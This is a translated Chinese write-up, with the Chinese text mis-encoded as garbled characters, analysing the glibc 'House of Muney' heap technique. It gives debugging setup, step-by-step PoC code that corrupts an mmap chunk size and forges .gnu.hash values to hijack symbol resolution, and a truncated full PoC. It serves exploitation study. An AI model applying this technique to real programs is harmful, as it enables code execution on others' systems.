# House of Muney ÂàÜÊûê
##### ËØëÊñáÂ£∞Êòé
Êú¨ÊñáÊòØÁøªËØëÊñáÁ´†
ËØëÊñá‰ªÖ‰æõÂèÇËÄÉÔºåÂÖ∑‰ΩìÂÜÖÂÆπË°®Ëææ‰ª•ÂèäÂê´‰πâÂéüÊñá‰∏∫ÂáÜ„ÄÇ
## GlibcÂ∏¶Ê∫êÁ†ÅË∞ÉËØï
Âõ†‰∏∫Âú®ÂàÜÊûêÁöÑÊúÄÂêéÊ∂âÂèäÈÄöËøá`GDB`Ë∞ÉËØïÊù•Á°ÆÂÆö‰∏Ä‰∫õÂÖ≥ÈîÆÂèòÈáèÁöÑÂèñÂÄºÔºåÂõ†Ê≠§‰∏∫‰∫ÜË∞ÉËØïÊñπ‰æøÔºåÂú®Ê≠§Â§ÑËØ¥ÊòéÂ¶Ç‰ΩïÂêØÂä®Â∏¶Ê∫êÁ†ÅÁöÑ`glibc`Ë∞ÉËØï
Ê≥®Ôºö‰ª•‰∏ãÊ≠•È™§ÂùáÂú®`ubuntu 21.04(Ubuntu GLIBC 2.31-0ubuntu9.2)`ÊµãËØïÈÄöËøá„ÄÇ
###  ÂÆâË£ÖdebugÁâàÊú¨ÁöÑÂä®ÊÄÅÈìæÊé•Â∫ì
‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§‰ª•ÂÆâË£ÖÂ∏¶`Debug`Á¨¶Âè∑ÁöÑ`Libc`Êñá‰ª∂
    sudo apt-get install libc6-dbg libc6-dbg:i386
    sudo apt-get install libc6-dev libc6-dev:i386
ÂÆâË£ÖÁªìÊùüÂêéÔºå‰ºöÂú®Á≥ªÁªüÁöÑ`/lib/debug`‰∏ãÂàõÂª∫ÂΩ¢Â¶Ç‰∏ãÂõæÁöÑÁõÆÂΩï
###  Ëé∑ÂèñlibcÊ∫êÁ†Å
Á°ÆËÆ§`source.list`ÂÜÖ`deb-src`È°πÂ∑≤ÁªèË¢´Ëß£Èô§Ê≥®Èáä
Âú®ÂæÖÂàÜÊûêÁ®ãÂ∫èÁöÑÂêåÁõÆÂΩï‰∏ã‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§Ëé∑Âèñ`libc`Ê∫êÁ†Å
    sudo apt source glibc
ËØ∑Ê≥®ÊÑèÔºÅÊ≠§ÂëΩ‰ª§‰ºöËé∑ÂèñÂΩìÂâçÊúÄÊñ∞ÁöÑ`ubuntu glibc`Ê∫êÁ†ÅÔºåÂõ†Ê≠§ËØ∑‰øùËØÅÂΩìÂâçÁöÑÁ≥ªÁªüÂÜÖÁöÑ`libc`ÁâàÊú¨‰∏∫ÊúÄÊñ∞
###  Ë∞ÉËØïÊ®°ÂºèÁºñËØëÂæÖË∞ÉËØïÁ®ãÂ∫è(‰ª•PoC‰∏∫‰æã)
‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§ÁºñËØëÁ®ãÂ∫è
    gcc -z lazy -g -o munmap_rewrite munmap_rewrite.c
PSÔºöÂÖ∂‰∏≠Ôºå`-z lazy`Áî®‰∫é‰øùËØÅ`PoC`ÂèØÁî®Ôºå‰∏éË∞ÉËØïÊ®°ÂºèÊó†ÂÖ≥
‰ΩøÁî®`gdb`ÂØπÂæÖÊµãÁ®ãÂ∫èËøõË°åÈôÑÂä†ÔºåÂπ∂ÊâßË°åÁõ∏ÂÖ≥ÁéØÂ¢ÉÈÖçÁΩÆ
    error404@Glibc-231:~$ gdb munmap_rewrite_normal
    GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
    Copyright (C) 2020 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later 
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    .
    Find the GDB manual and other documentation resources online at:
        .
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    pwndbg: loaded 197 commands. Type pwndbg [filter] for a list.
    pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
    Reading symbols from munmap_rewrite_normal...
    pwndbg> set debug-file-directory /glibc-2.31/elf
    pwndbg> dir /glibc-2.31/elf
    Source directories searched: /glibc-2.31/elf:$cdir:$cwd
    pwndbg> info share ld-linux
    From                To                  Syms Read   Shared Object Library
    0x00007ffff7fd0100  0x00007ffff7ff2674  Yes (*)     /lib64/ld-linux-x86-64.so.2
    (*): Shared library is missing debugging information.
    pwndbg> add-symbol-file /usr/lib/debug/lib/x86_64-linux-gnu/ld-2.31.so 0x00007ffff7fd0100
    add symbol table from file "/usr/lib/debug/lib/x86_64-linux-gnu/ld-2.31.so" at
        .text_addr = 0x7ffff7fd0100
    Reading symbols from /usr/lib/debug/lib/x86_64-linux-gnu/ld-2.31.so...
## PoC ÂàÜÊûê
### ‚ÄúÁ™ÉÂèñ‚Äù`Glibc`ÂÜÖÂ≠òËá≥Â†Ü‰∏≠(`RO -> NO`)
È¶ñÂÖàÂàÜÈÖç‰∏Ä‰∏™`Chunk`ÈòªÊ≠¢`Top Chunk`ÂêàÂπ∂ÁöÑÂèëÁîü
    int* ptr1 = malloc(0x10);
ÈöèÂêéÁî≥ËØ∑‰∏§‰∏™ÁâπÊÆäÂ§ßÂ∞è(`0x100000`)ÁöÑ`Chunk`(ÊûÅÂ§ßÂùó)ÔºåËøôÁßçÂ§ßÂ∞èÁöÑ`Chunk`Â∞Ü‰∏ç‰ºöÂ≠òÊîæ‰∫éÂ∏∏ËßÑÁöÑÂ†ÜÁ©∫Èó¥ÔºåËÄåÊòØÊîæÂú®ÁâπÊÆäÁöÑ`mmaped`Âå∫Âüü„ÄÇ
    long long* mmap_chunk_1 = malloc(0x100000);
    printf("The first malloc chunk goes below LibC: %p\n", mmap_chunk_1);
    long long* mmap_chunk_2 = malloc(0x100000);
    printf("The second malloc chunk goes below the first malloc chunk: %p\n", mmap_chunk_2);
Ê≠§Êó∂ÔºåÂÜÖÂ≠òÂ∏ÉÂ±ÄÊÉÖÂÜµ‰∏∫(ÈÄªËæëÂõæ)Ôºö
(Áî±‰ΩéÂú∞ÂùÄÂêëÈ´òÂú∞ÂùÄÊéíÂ∏É)  
---  
Â∏∏ËßÑÂ†ÜÂå∫Âüü  
‚Ä¶‚Ä¶  
mmap_chunk_2  
mmap_chunk_1  
Glibc  
‚Ä¶‚Ä¶  
LD Âå∫Âüü  
ÂÜÖÂ≠òÂ∏ÉÂ±ÄÊÉÖÂÜµ‰∏∫(ÂÆû‰æãÂõæ)Ôºö
ÂÜÖÂ≠òÂÆûÈôÖÊÉÖÂÜµ‰∏∫(‰ª•‰∏äÂÆû‰æã‰∏éÊú¨ÂÆû‰æãÂπ∂ÈùûÂêå‰∏ÄÊ¨°ËøêË°å)Ôºö
ÂèØ‰ª•ÁúãÂà∞ÔºåÊ≠§Êó∂`mmap_chunk_2`Âíå`mmap_chunk_1`ÁöÑ`Prev_Size`Âùá‰∏∫`0`Ôºå`Size`Âùá‰∏∫`0x101002`
ÈÄöËøá`readelf -all /lib/x86_64-linux-gnu/libc.so.6`ÂØπ`glibc`Êñá‰ª∂ÂàÜÊûê
Êàë‰ª¨ÁöÑÁõÆÊ†áÊòØË¶ÜÁõñ`.gnu.hash`Âíå`.dynsym`ÔºåÂõ†Ê≠§Êàë‰ª¨Ê≠§Â§ÑÈÄâÁî®`0x15000`‰Ωú‰∏∫ÂÅèÁßª(Á°Æ‰øù‰∏ç‰ºöÂΩ±ÂìçÂà∞`.dynstr`)
    int libc_to_overwrite = 0x15000;
Ê≠§Â§ñÔºåÊàë‰ª¨ËøòÂøÖÈ°ª‰øùËØÅÊñ∞ÁöÑ`size`‰∏∫ÂéüÊù•ÁöÑ‰∏§‰∏™`size`‰πãÂíåÂä†‰∏äÊ≠§ÂÅèÁßªÔºåËÄåÊàë‰ª¨ÂèàÂ∑≤Áü•`chunk`ÁöÑ`size`Â≠òÂú®Ê†áÂøó‰ΩçÔºåÈÇ£‰πàÂÆûÈôÖÂ§ßÂ∞èËÆ°ÁÆó‰∏∫
    int fake_chunk_size = (0xFFFFFFFFFD & mmap_chunk_2[-1]) + (0xFFFFFFFFFD & mmap_chunk_1[-1]);     
    fake_chunk_size += libc_to_overwrite | 2;
ÊâßË°åË¶ÜÁõñÊìç‰Ωú
    mmap_chunk_2[-1] = fake_chunk_size;
ÂÜÖÂ≠òÂÆûÈôÖÊÉÖÂÜµ‰∏∫Ôºö
Êé•‰∏ãÊù•ÂØπ`mmap_chunk_2`ËøõË°åÈáäÊîæ
    free(mmap_chunk_2);
Ê≥®ÊÑèüì¢ÔºöÊ≠§Êó∂Â∞ÜÈíàÂØπÈÉ®ÂàÜ`glibc`ÂÜÖÂ≠òËøõË°å`munmap`ÈáäÊîæÊìç‰ΩúÔºå‰∏éÂ∏∏ËßÑÂ†ÜÂå∫ÂüüÁöÑ`Chunk`ÈáäÊîæ‰∏çÂêåÔºåÊ≠§ÈÉ®ÂàÜÂÜÖÂ≠òÂ∞ÜË¢´Áõ¥Êé•Êî∂ÂõûËá≥ÂÜÖÊ†∏ÔºåÊ≠§Êó∂ÁöÑÂÜÖÂ≠òÁä∂ÊÄÅÂ∞ÜÂ§Ñ‰∫é‰∏çÂèØËØªÂÜôÁöÑÁä∂ÊÄÅ(ËØªÂÜôÊìç‰ΩúÂùá‰ºöËß¶ÂèëÂºÇÂ∏∏)„ÄÇËÄåÂª∂ËøüÁªëÂÆöÊú∫Âà∂Â∞Ü‰ºöÂØπ`.gnu.hash`Âíå`.dynsym`‰∏§‰∏™Âå∫ÂüüËøõË°åËØªÂÜôÔºåÂõ†Ê≠§Êàë‰ª¨Ê≠§Êó∂‰ªÖËÉΩË∞ÉÁî®‰πãÂâçÂ∑≤Ë∞ÉÁî®ËøáÁöÑÂáΩÊï∞ÔºåÂèç‰æãÂ¶Ç‰∏ãÔºö
  * Â∞ùËØïÂØπÂ∑≤ÈáäÊîæÂÜÖÂ≠òËøõË°åËØªÂÜô 
        mmap_chunk_2[0] = 0xdeadbeef;
  * Â∞ùËØïË∞ÉÁî®‰πãÂâçÊú™Ë∞ÉÁî®ËøáÁöÑÂáΩÊï∞ 
        exit(0);
### ÂèñÂõû‚ÄúÁ™ÉÂèñ‚ÄùÁöÑ`Glibc`ÂÜÖÂ≠ò(`RO -> RW`)
Êé•‰∏ãÊù•ÂàÜÈÖç‰∏Ä‰∏™Êõ¥Â§ßÁöÑ`Chunk`ÔºåËøôÊòØÂõ†‰∏∫`M_MMAP_THRESHOLD`‰ºöÈöèÁùÄ`munmap/free`Êìç‰ΩúÂèëÁîüÂ¢ûÈïøÔºåËã•ÂàÜÈÖçÁöÑÂ§ßÂ∞èÂ∞è‰∫é`M_MMAP_THRESHOLD`ÔºåÂ†ÜÊìç‰ΩúÂ∞ÜÂõûÂà∞Â∏∏ËßÑÂ†ÜÁ©∫Èó¥ËøõË°å„ÄÇÂõ†Ê≠§ÔºåÁî≥ËØ∑‰∏Ä‰∏™`0x300000`Â§ßÂ∞èÁöÑ`Chunk`
    uint8_t*  overlapping_chunk = malloc(0x300000);
Ëá≥Ê≠§ÔºåÊàë‰ª¨ÊàêÂäü‰ªéÂÜÖÂ≠òÂèñÂõû‰∫Ü‰πãÂâç‚ÄúÂÅ∑Ëµ∞ÁöÑ‚Äù`Glibc`ÂÜÖÂ≠ò„ÄÇÁé∞Âú®ÔºåÊàë‰ª¨ÂèØ‰ª•Êìç‰Ωú`.gnu.hash`Âíå`.dynsym`‰∫Ü„ÄÇ
### ‰º™ÈÄ†`Glibc`ÂÜÖÂ≠ò&Âä´ÊåÅÁ®ãÂ∫èÊµÅ
Êé•‰∏ãÊù•Êúâ‰∏âÁßçÊñπÊ°àÂèØ‰æõÈÄâÊã©Ôºö
  1. ÈÄêÂ≠óËäÇÂ§çÂà∂`GilbC`ÁöÑÂÜÖÂÆπÔºåÈöèÂêéÂä´ÊåÅÁ¨¶Âè∑Ëß£ÊûêË°®„ÄÇ
  2. ÂÆåÂÖ®Âä´ÊåÅÁ¨¶Âè∑Ëß£ÊûêËøáÁ®ãÂπ∂ÊâßË°å‰ªªÊÑè‰ª£Á†Å
  3. Êª°Ë∂≥Á¨¶Âè∑Ëß£ÊûêÁöÑÊúÄ‰ΩéË¶ÅÊ±ÇÔºåÈöèÂêéÂä´ÊåÅÁ¨¶Âè∑Ëß£ÊûêË°®„ÄÇ
ËøôÈáåÊàë‰ª¨ÈÄâÁî®Á¨¨‰∏âÁßçÊñπÊ°àÂπ∂ËØ¶Ëø∞ÊûÑÈÄ†ËøáÁ®ãÔºåÈ¶ñÂÖàÂêØÂä®ÂØπÊØîË∞ÉËØï(Â∑¶‰æß‰∏∫ÁªèËøáÊîªÂáªÂêéÁöÑÁ®ãÂ∫èÔºåÂè≥‰æß‰∏∫Ê≠£Â∏∏Á®ãÂ∫è)
Âú®`do_lookup_x`Â§Ñ‰∏ãÊñ≠ÔºåËøêË°å
‰∏§ËæπÂêåÊ≠•ËøêË°åÔºåÂèØ‰ª•ÂèëÁé∞ÂΩìË¢´ÊîªÂáªÁ®ãÂ∫èËøêË°åËá≥`glibc-2.31/elf/dl-lookup.c:423`Â§ÑÊó∂‰ºöÂèëÁîüË∑≥Âá∫ÔºåÁõ∏ÂÖ≥‰ª£Á†ÅÂ¶Ç‰∏ãÔºö
    .......
    const ElfW(Addr) *bitmask = map->l_gnu_bitmask;
    if (__glibc_likely (bitmask != NULL))
    {
        ElfW(Addr) bitmask_word = bitmask[(new_hash / __ELF_NATIVE_CLASS) & map->l_gnu_bitmask_idxbits];
        unsigned int hashbit1 = new_hash & (__ELF_NATIVE_CLASS - 1);
        unsigned int hashbit2 = ((new_hash >> map->l_gnu_shift) & (__ELF_NATIVE_CLASS - 1));
        if (__glibc_unlikely ((bitmask_word >> hashbit1) & (bitmask_word >> hashbit2) & 1))
        {
            Elf32_Word bucket = map->l_gnu_buckets[new_hash % map->l_nbuckets];
            if (bucket != 0)
            {
                const Elf32_Word *hasharr = &map->l_gnu_chain_zero[bucket];
                do
                    if (((*hasharr ^ new_hash) >> 1) == 0)
                    {
                        symidx = ELF_MACHINE_HASH_SYMIDX (map, hasharr);
                        sym = check_match (undef_name, ref, version, flags,
                                           type_class, &symtab[symidx], symidx,
                                           strtab, map, &versioned_sym,
                                           &num_versions);
                        if (sym != NULL)
                            goto found_it;
                    }
                while ((*hasharr++ & 1u) == 0);
            }
        }
    .......
ÈÇ£‰πàÊàë‰ª¨ÂèØ‰ª•Âú®Ê≠§Â§Ñ‰∏ãÊñ≠ÔºåÂèØ‰ª•ÂèëÁé∞ÔºåÁ¨¨‰∏ÄÊ¨°Á®ãÂ∫èÊäµËææÊ≠§Êñ≠ÁÇπ‰ΩøÁî®ÁöÑÊòØÂÇ®Â≠òÂú®Á®ãÂ∫èÊÆµÁöÑ`bitmask`ÔºåËÄåÁ¨¨‰∫åÊ¨°ÁªèËøáÊ≠§Â§ÑÔºåÂ∞Ü‰ºö‰ΩøÁî®Â≠òÂú®‰∫é`libc`‰∏≠ÁöÑÂÄº„ÄÇÁ®ãÂ∫è‰ºöÂèñ`bitmask[offset]`Â§ÑÁöÑÂÄºËøõË°åÂêéÁª≠ËøêÁÆóÔºåÈÇ£‰πàÊàë‰ª¨Âè™Ë¶ÅÂ∞Ü`bitmask[offset]`Â§ÑÁöÑÂÄºËÆæÁΩÆ‰∏∫Ê≠£Á°ÆÂÄºÂç≥ÂèØ„ÄÇ
ÂèØ‰ª•ÁúãÂà∞ÔºåÊ≠§Êó∂Ôºå`bitmask[offset]`ÁöÑÊ≠£Á°ÆÂÄºÂ∫î‰∏∫`0xf000028c0200130e`,ËÄåÂèóÊîªÂáªÁöÑÁ®ãÂ∫èÂõ†‰∏∫`mmap`ÁöÑÂΩ±Âìç`bitmask`ÂÜÖÂÆπ‰∏∫Á©∫„ÄÇ‰ΩÜÊòØÊàë‰ª¨Èù¢ÂâçËøòÊúâ‰∏Ä‰∏™ÂáΩÂæÖËß£ÂÜ≥ÁöÑÈóÆÈ¢òÈÇ£Â∞±ÊòØ`bitmask[offset]`ÁöÑ‰ΩçÁΩÆÊòØÊú™Áü•ÁöÑÔºå‰πüÂ∞±ÊòØÔºåÂæÄÂì™ÈáåÂÜôÁöÑÈóÆÈ¢ò„ÄÇÊ≠§Â§Ñ‰ΩøÁî®`pwndbg`Êèê‰æõÁöÑ`search`ÂäüËÉΩËøõË°åÂÆö‰Ωç„ÄÇ
Ê≠§Â§ÑÂ∫îÂèñË∑ùÁ¶ª`bitmask`ÊúÄËøëÁöÑ‰ΩçÁΩÆ
Âç≥`0x7ffff7dca070`ÁöÑ‰ΩçÁΩÆÔºå‰πüÂ∞±ÊòØ`Glibc_base + 0x4070`ÁöÑ‰ΩçÁΩÆ„ÄÇÈÇ£‰πàÊ≠§Â§Ñ‰ΩøÁî®`set
bitmask_word=0xf000028c0200130e`ÂëΩ‰ª§ÂØπÂèóÊîªÂáªÁ®ãÂ∫èËøõË°å‰øÆË°•
ÂèØ‰ª•ÂèëÁé∞ÔºåÂ∑≤ÁªèÈ°∫Âà©ËøõÂÖ•‰∫Ü`line 426`
Á¥ßÊé•ÁùÄÔºåÂèØ‰ª•ÂèëÁé∞Ôºå`bucket`ÁöÑÂÄº‰πüÊòØ‰ªé`map`‰∏≠ÂèñÁöÑÔºåÂõ†Ê≠§ÂêåÊ†∑ÈúÄË¶Å‰øÆË°•
ÈÇ£‰πà‰∏éÂàöÊâçÁ±ª‰ºº
ÂèØ‰ª•Ê±ÇÂá∫`bucket`ÁöÑÂú∞ÂùÄ‰∏∫`Glibc_base + 0x2B94`ÔºåÂÄºÂ∫î‰∏∫`0x86`„ÄÇ‰∏¥Êó∂‰øÆË°•Êåá‰ª§‰∏∫`set bucket=0x86`
‰øÆÂ§çÊàêÂäüÔºÅÊúÄÂêéÈúÄË¶Å‰øÆÂ§çÁöÑÂÄºÂ∞±ÊòØ`hasharr`ÁöÑÂÄº‰∫Ü
Âêå‰∏äÊ≠•È™§ÂèØÂæóÔºåÈúÄË¶ÅÂêë`Glibc + 0x5264`ÁöÑ‰ΩçÁΩÆÔºåÂÜôÂÖ•`0x7c967e3e7c93f2a0`
ÊúÄÂêéÔºåÂä´ÊåÅ`sym->st_value`‰∏∫Ë¶ÅÊâßË°åÁöÑ‰ª£Á†ÅÂú∞ÂùÄ(ROP/System/One_gadgets)
###  ÂÆåÊï¥PoC
    #include 
    #include 
    #include  
    /*
    Technique should work on all versions of GLibC. However, the offsets 
    used are specific for this particular compilation of GLibC 
    and for the exit function.
    Compile: `./compile.sh`
    - Compiles AND sets the loader to the proper location
    POC written by Maxwell Dulin (Strikeout) 
    For a step by step on how this works, please visit the following link:
    - https://maxwelldulin.com/BlogPost?post=6967456768.
    */
    int main(){
        /*
        A primer on Mmap chunks in GLibC
            ==================================
            In GLibC, there is a point where an allocation is so large that malloc
            decides that we need a seperate section of memory for it, instead 
            of allocating it on the normal heap. This is determined by 
        the mmap_threshold. 
            Instead of the normal logic for getting a chunk, the system call *Mmap* is 
            used. This allocates a section of virtual memory and gives it back to the user. 
            Similarly, the freeing process is going to be different. Instead 
            of a free chunk being given back to a bin or to the rest of the heap,
            another syscall is used: *Munmap*. This takes in a pointer of a previously 
            allocated Mmap chunk and releases it back to the kernel. 
            Mmap chunks have special bit set on the size metadata: the second bit. If this 
            bit is set, then the chunk was allocated as an Mmap chunk. 
            Mmap chunks have a prev_size and a size. The *size* represents the current 
            size of the chunk. The *prev_size* of a chunk represents the left over space
            from the size of the Mmap chunk (not the chunks directly belows size). 
            However, the fd and bk pointers are not used, as Mmap chunks do not go back 
            into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of 
            the chunk must be page-aligned.
            For more information on mmap chunks in GLibC, read this post: 
            http://tukan.farm/2016/07/27/munmap-madness/
            A primer on Symbol Lookup in GLibC
            ======================================
            There is some black magic that is constantly happpening that we do not even 
            realize! When we include functions (from a library) this is loaded into 
            its own object file and there is just a reference to some function that our 
            program does not even know about! Printf is not written within our executable.
            its written with GLibC. So, why? 
            Including EVERY function/symbol from GLibC into our little program would 
               be terribly inefficient. Our little C program does not use EVERY single 
            function in LibC. Additionally, several other programs are likely to use GLibC
            throughout the execution of our program. So, the main goal of this dynamic symbol 
            table lookup is to shrink the size of an executable and promote reuseability. 
            But how does this work? 
            There are two major parts to this:
            1. The PLT/GOT setup within the binary 
            2. The symbol lookup within the library 
            First, at linking time (the code has been started, as an executable, but is
            altering the binary in order to make it deal with the environment). At linking
            time the functions (i.e. printf) is pointed to a stub called the *PLT* or 
            procedure linkage table. The PLT is simply code in place of our actual function.
            The first time this is called, a lookup is done in the *GOT* or global offset 